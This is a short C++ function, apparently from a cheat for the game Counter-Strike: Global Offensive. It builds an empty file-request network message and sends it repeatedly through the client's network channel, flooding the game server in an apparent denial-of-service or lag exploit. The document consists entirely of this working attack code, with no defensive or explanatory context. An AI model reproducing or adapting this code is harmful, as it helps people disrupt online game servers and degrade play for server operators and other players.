__declspec(noinline) static void spam_request_netfile(int send_amount) {
	INetChannel *nc;
	uint8_t     msg[60]; // [ebp-3Ch] -- 60

	nc = g_csgo.m_clientstate->m_NetChannel;
	if (!nc)
		return;

	// construct netmsg for CNETMsg_File.
	g_csgo.m_CNETMsg_File_ctor(&msg);

	// fill with null data.
	g_csgo.m_netmsgfile_protobuf_assign(&msg[4], "");

	// fill voice stream with file requests.
	for (int i = 0; i < send_amount; ++i)
		nc->SendNetMsg(&msg, false, true);

	// force send message now.
	nc->Transmit();
}